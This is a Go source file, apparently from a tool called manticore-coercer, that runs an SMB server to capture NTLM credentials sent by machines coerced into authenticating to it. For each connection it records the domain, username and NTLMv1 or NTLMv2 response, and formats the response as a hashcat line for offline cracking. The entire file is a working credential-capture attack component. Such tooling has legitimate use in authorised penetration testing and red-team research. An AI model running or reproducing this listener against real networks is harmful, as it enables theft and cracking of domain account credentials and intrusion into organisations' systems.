package listener

import (
	"fmt"
	"time"

	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server"
	"github.com/TheManticoreProject/Manticore/windows/errors/nt_status"
	"github.com/TheManticoreProject/manticore-coercer/methods"
	"github.com/TheManticoreProject/manticore-coercer/results"
)

type SMBListener struct {
	addr    string
	srv     *server.Server
	handler *server.CaptureHandler
	ch      chan results.AuthResult
	done    chan struct{}
}

func NewSMBListener(listenAddr string, port int) (*SMBListener, error) {
	addr := fmt.Sprintf("%s:%d", listenAddr, port)

	ch := make(chan results.AuthResult, 64)

	captureConfig := server.CaptureConfig{
		OnCredential: func(cred server.Credential) {
			hashLine, hashMode, err := cred.Hashcat()
			if err != nil {
				hashLine = ""
				hashMode = 0
			}
			ntlmVersion := 1
			if cred.IsNTLMv2() {
				ntlmVersion = 2
			}
			ar := results.AuthResult{
				FromAddr:    cred.RemoteAddr.String(),
				Time:        cred.Time,
				AuthType:    methods.AuthSMB,
				NTLMVersion: ntlmVersion,
				HashcatLine: hashLine,
				HashcatMode: hashMode,
				Domain:      cred.Domain,
				Username:    cred.Username,
			}
			select {
			case ch <- ar:
			default:
			}
		},
		Status: nt_status.NT_STATUS_SUCCESS,
	}

	handler, err := server.NewCaptureHandler(captureConfig)
	if err != nil {
		return nil, fmt.Errorf("capture handler: %w", err)
	}

	srv, err := server.NewServer(server.Config{})
	if err != nil {
		return nil, fmt.Errorf("smb server: %w", err)
	}
	srv.RegisterHandler(handler)

	return &SMBListener{
		addr:    addr,
		srv:     srv,
		handler: handler,
		ch:      ch,
		done:    make(chan struct{}),
	}, nil
}

func (l *SMBListener) Start() error {
	errCh := make(chan error, 1)
	go func() {
		defer close(l.done)
		errCh <- l.srv.ListenAndServe(l.addr)
	}()

	select {
	case err := <-errCh:
		return err
	case <-time.After(100 * time.Millisecond):
		return nil
	}
}

func (l *SMBListener) Stop() error {
	err := l.srv.Close()
	<-l.done
	close(l.ch)
	return err
}

func (l *SMBListener) Results() <-chan results.AuthResult {
	return l.ch
}
